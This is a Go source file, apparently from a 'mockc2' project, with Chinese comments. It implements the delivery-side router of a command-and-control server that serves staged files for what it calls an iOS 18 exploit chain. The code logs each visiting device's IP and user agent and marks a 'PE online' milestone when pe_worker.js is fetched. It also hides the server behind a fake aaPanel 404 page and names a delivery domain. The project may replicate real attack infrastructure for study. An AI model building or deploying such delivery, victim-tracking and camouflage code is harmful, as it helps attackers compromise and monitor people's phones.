package server

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// 交付域路由：boot.html / boot.js / B10/* / 根别名（单链 iOS 18，无 A8/c.html 分流）。
//
// 注意：该 router 必须在最后 include —— /{p:path} catch-all 会覆盖一切路径。

var ctByExt = map[string]string{
	".html": "text/html; charset=utf-8",
	".js":   "application/javascript; charset=utf-8",
	".json": "application/json",
	".txt":  "text/plain; charset=utf-8",
}

// resolveStatic 安全命中 pages/ 下文件；根路径候选别名 pages/B10/。
func resolveStatic(path string) string {
	if path == "" {
		return ""
	}
	p := strings.TrimPrefix(path, "/")
	if strings.Contains(p, "..") || strings.Contains(p, "\\") || strings.ContainsRune(p, 0) {
		return ""
	}
	// 管理台静态（www/admin）不经交付 catch-all 暴露，仅通过鉴权路由 /admin 访问，避免绕过登录。
	if p == "admin" || strings.HasPrefix(p, "admin/") {
		return ""
	}
	s := config.Get()
	cand := filepath.Join(s.PagesRoot, filepath.FromSlash(p))
	if isFile(cand) {
		return cand
	}
	// boot.html 位于 www/ 下（由上面的通用命中）；此处保留项目根回退以兼容历史布局
	if p == "boot.html" {
		rootFile := filepath.Join(filepath.Dir(s.PagesRoot), "boot.html")
		if isFile(rootFile) {
			return rootFile
		}
	}
	name := filepath.Base(p)
	if s.RootAlias[name] {
		cand2 := filepath.Join(s.PagesRoot, "love", name)
		if isFile(cand2) {
			return cand2
		}
	}
	return ""
}

func isFile(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && !fi.IsDir()
}

func staticResponse(w http.ResponseWriter, r *http.Request, fp string) {
	data, err := os.ReadFile(fp)
	if err != nil {
		writeText(w, http.StatusNotFound, "404 Not Found")
		return
	}
	ext := strings.ToLower(filepath.Ext(fp))
	ct := ctByExt[ext]
	if ct == "" {
		ct = "application/octet-stream"
	}
	s := config.Get()
	cache := s.CacheControl
	if ext == ".js" {
		// 缓存分层（对齐原站）：stage JS 10min 可缓存
		cache = "public, max-age=600"
	}
	h := w.Header()
	h.Set("Content-Type", ct)
	h.Set("Cache-Control", cache)
	h.Set("Server", s.ServerHeader)
	base := filepath.Base(fp)
	// 交付入口即登记来访（手机访问立刻在「来访登记/访问设备」可见，无需等 sync POST）
	if base == "boot.html" || base == "group.html" {
		store.SafeCall(func() {
			store.RecordDevice(map[string]any{
				"ip": clientIP(r), "ua": r.Header.Get("User-Agent"), "host": hostHeader(r),
			})
		})
	}
	if base == "pe_worker.js" {
		// 门禁对齐：交付侧下发 pe_worker.js 时种 PE 锁 cookie
		h.Set("Set-Cookie", store.PELockCookie())
		// 遥测里程碑：PE 上线
		store.SafeCall(func() {
			store.RecordPeEvent("pe", clientIP(r), r.Header.Get("User-Agent"), hostHeader(r), "")
		})
	}
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}

const aaPanel404 = "<!DOCTYPE html><html><head><title>404 Not Found</title><style>" +
	".btw{margin-top:60px;}p{font-size:16px;}</style></head><body>" +
	"<div class='btw'><p>404 Not Found: Your requested page doesn't exist</p>" +
	"<p>Sorry, this is no functional page</p></div></body></html>"

func isC2Host(r *http.Request) bool {
	// 单域名部署（test.dhropjayk57qg3g.lat）无独立 C2 域，统一交付域 404 观感。
	return false
}

func registerDelivery(rt *Router) {
	rt.GET("/", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if isC2Host(r) {
			writeText(w, http.StatusForbidden, "403 Forbidden")
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(aaPanel404))
	})
	rt.GET("/index.html", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if isC2Host(r) {
			writeText(w, http.StatusForbidden, "403 Forbidden")
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(aaPanel404))
	})

	// catch-all —— 保持放最后声明；单链无分流，未命中即 404
	rt.Add([]string{"GET", "POST"}, "/{p:path}", func(w http.ResponseWriter, r *http.Request, params map[string]string) {
		if fp := resolveStatic(params["p"]); fp != "" {
			staticResponse(w, r, fp)
			return
		}
		writeText(w, http.StatusNotFound, "404 Not Found")
	})
}
